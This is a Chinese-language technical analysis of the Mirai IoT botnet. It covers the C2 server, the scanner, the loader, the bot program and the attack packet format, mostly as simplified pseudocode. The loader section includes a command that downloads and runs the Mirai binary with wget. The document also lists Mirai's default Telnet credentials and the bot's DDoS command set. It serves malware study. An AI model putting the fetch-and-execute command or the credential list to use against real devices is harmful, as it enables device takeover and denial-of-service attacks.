# Mirai架构深度剖析

### 3.1 整体架构

Mirai僵尸网络由以下核心组件构成：

```
┌─────────────────────────────────────────────────┐
│                  Mirai 架构图                     │
├─────────────────────────────────────────────────┤
│                                                  │
│   ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│   │ CNC服务器 │    │ Scan器   │    │ Loader   │  │
│   │ (C2)     │    │ (扫描器) │    │ (注入器) │  │
│   └────┬─────┘    └────┬─────┘    └────┬─────┘  │
│        │               │               │        │
│        │     ┌─────────┴─────────┐    │        │
│        │     │   Bot节点 (僵尸)   │    │        │
│        │     │  ┌───┐ ┌───┐ ┌───┐│    │        │
│        │     │  │ARM│ │MIP│ │x86││    │        │
│        │     │  └───┘ └───┘ └───┘│    │        │
│        │     └───────────────────┘    │        │
│        │               │               │        │
│   ┌────┴──────────────┴───────────────┴────┐   │
│   │         Report Server (数据库)           │   │
│   │      存储扫描结果、感染设备信息           │   │
│   └─────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

### 3.2 CNC服务器（C2通信与控制）

CNC服务器是整个僵尸网络的指挥中心，负责：

```c
// Mirai CNC核心结构（伪代码）
struct cnc_server {
    int listen_fd;          // 监听Socket
    int admin_fd;           // 管理员连接
    struct bot_t **bots;    // Bot列表
    int bot_count;          // Bot数量
    char *attack_cmd;       // 当前攻击指令
    
    // 功能:
    // 1. 接受Bot连接
    // 2. 下发攻击指令
    // 3. 收集Bot状态报告
    // 4. 管理员远程控制
};

// Bot连接验证流程
int bot_connect_verify(struct bot_t *bot) {
    // 1. 接收Bot汇报的架构信息
    recv(bot->fd, bot->arch, 8, 0);
    
    // 2. 验证Bot密钥
    if (check_bot_key(bot) != 0)
        return -1;
    
    // 3. 加入Bot列表
    add_to_botlist(bot);
    
    // 4. 发送确认
    send(bot->fd, "\x00\x00\x00\x03", 4, 0);
    
    return 0;
}
```

### 3.3 扫描器（Scanner）

Mirai的扫描器是其快速传播的关键：

```c
// Mirai扫描器逻辑（简化版）
void scanner_thread() {
    while (1) {
        // 1. 随机生成目标IP
        uint32_t ip = get_random_ip();
        
        // 2. 排除不可扫描地址
        if (is_excluded(ip))  // 排除内网/政府/军方IP
            continue;
        
        // 3. 尝试连接Telnet (23) 或SSH (2323)
        int fd = connect_telnet(ip, 23);
        if (fd < 0) {
            fd = connect_telnet(ip, 2323);
            if (fd < 0) continue;
        }
        
        // 4. 等待登录提示
        if (wait_for_prompt(fd) < 0) continue;
        
        // 5. 遍历凭证表
        for (int i = 0; i < cred_count; i++) {
            if (try_login(fd, creds[i].user, creds[i].pass) == 0) {
                // 6. 成功！上报给Report Server
                report_infection(ip, port, creds[i]);
                break;
            }
        }
        close(fd);
    }
}
```

Mirai默认凭证表（部分）：

```
root xc3511       admin888 admin
root vizxv         root admin
root admin          admin admin
root 888888         guest guest
root xmhdipc        default default
root 888888        root 666666
root admin          root 888888
root klv123         admin password
root hi3518         admin 1111
root 351351         admin 1234
...（共60+组）
```

### 3.4 Loader（注入器）

Loader负责将恶意程序实际注入到受感染设备：

```
Loader工作流程:
1. 从Report Server获取感染成功的目标列表
2. 连接到目标设备的Telnet/SSH
3. 下载并执行busybox（提供wget/tftp功能）
4. 根据设备架构选择对应的Mirai二进制文件:
   - ARM (arm, arm5, arm6, arm7)
   - MIPS (mips, mipsel)
   - x86 (x86, x86_64)
   - PowerPC (ppc)
   - SPARC
   - SH4
5. 执行: ./mirai.<arch>
6. Mirai连接CNC服务器，加入僵尸网络
7. 清除竞品僵尸网络（杀死占用23端口的进程）
```

```python
# Mirai Loader 模拟实现（Python伪代码）
class MiraiLoader:
    """Mirai注入器模拟"""
    
    ARCHITECTURES = ['arm', 'arm5', 'arm6', 'arm7', 
                     'mips', 'mipsel', 'x86', 'x86_64',
                     'ppc', 'sparc', 'sh4']
    
    def __init__(self, report_server: str, loader_port: int = 8080):
        self.report_server = report_server
        self.loader_port = loader_port
        self.infected = 0
        
    def load_target(self, ip: str, port: int, 
                    username: str, password: str) -> bool:
        """注入目标设备"""
        try:
            # 1. 连接Telnet
            conn = self._connect_telnet(ip, port)
            if not conn:
                return False
            
            # 2. 登录
            if not self._login(conn, username, password):
                return False
            
            # 3. 探测架构
            arch = self._detect_arch(conn)
            if arch not in self.ARCHITECTURES:
                logger.warning(f"未知架构: {arch}")
                return False
            
            # 4. 下载并执行Mirai
            cmd = f"cd /tmp; wget http://{self.loader_port}/mirai.{arch}; "
            cmd += f"chmod +x mirai.{arch}; ./mirai.{arch}"
            
            conn.execute(cmd)
            self.infected += 1
            logger.info(f"成功注入 {ip}:{port} (架构: {arch})")
            return True
            
        except Exception as e:
            logger.error(f"注入失败 {ip}: {e}")
            return False
    
    def _detect_arch(self, conn) -> str:
        """通过命令输出探测CPU架构"""
        output = conn.execute("cat /proc/cpuinfo 2>/dev/null || uname -m")
        if 'ARM' in output or 'arm' in output:
            if 'ARMv6' in output: return 'arm6'
            if 'ARMv7' in output: return 'arm7'
            if 'ARMv5' in output: return 'arm5'
            return 'arm'
        if 'MIPS' in output: return 'mips'
        if 'mipsel' in output: return 'mipsel'
        if 'x86_64' in output: return 'x86_64'
        if 'i686' in output or 'i386' in output: return 'x86'
        return 'unknown'
```

### 3.5 Bot端程序

Bot端运行在受感染的IoT设备上，主要功能包括：

```c
// Mirai Bot端核心功能（伪代码）
void bot_main() {
    // 1. 反调试/反沙箱检测
    if (detect_gdb() || detect_sandbox()) 
        exit(0);
    
    // 2. 清除竞品（杀死占用23端口的进程）
    kill_competitors();
    
    // 3. 随自身进程（重命名为[xxx]）
    disguise_process();
    
    // 4. 连接CNC服务器
    int cnc_fd = connect_cnc(CNC_IP, CNC_PORT);
    
    // 5. 主循环
    while (1) {
        // 接收指令
        int cmd = recv_command(cnc_fd);
        
        switch (cmd) {
            case CMD_ATTACK_HTTP:
                attack_http(target, port, duration);
                break;
            case CMD_ATTACK_TCP:
                attack_tcp(target, port, duration);
                break;
            case CMD_ATTACK_UDP:
                attack_udp(target, port, duration);
                break;
            case CMD_ATTACK_DNS:
                attack_dns(target, duration);
                break;
            case CMD_ATTACK_GRE:
                attack_gre(target, duration);
                break;
            case CMD_KILL:
                // 杀死所有攻击进程
                kill_attacks();
                break;
            case CMD_SCANNER_OFF:
                scanner_enabled = 0;
                break;
            case CMD_SCANNER_ON:
                scanner_enabled = 1;
                break;
        }
    }
}
```

### 3.6 Mirai攻击命令格式

Mirai CNC下发的攻击指令使用二进制格式：

```
攻击指令包格式:
┌──────┬──────┬──────────┬──────────┬──────────────────┐
│ 0x00 │ 0x00 │ 攻击类型 │ 攻击时间 │ 目标IP数量       │
│ 2字节│ 2字节│ 1字节    │ 4字节    │ 1字节            │
└──────┴──────┴──────────┴──────────┴──────────────────┤
│ 目标IP列表（每个4字节）                               │
├──────────────────────────────────────────────────────┤
│ 目标端口                                              │
│ 2字节                                                 │
├──────────────────────────────────────────────────────┤
│ 攻击参数长度  │ 攻击参数数据                         │
│ 2字节        │ 变长                                  │
└──────────────────────────────────────────────────────┘

攻击类型列表:
0x01: HTTP洪水
0x02: TCP洪水
0x03: UDP洪水
0x04: DNS放大
0x05: GRE协议洪水
0x06: SYN洪水
0x07: ACK洪水
0x08: VSE（Valve Source Engine）洪水
0x09: DNS硬编码
0x0A: STOMP（STOMP协议洪水）
```

---

---

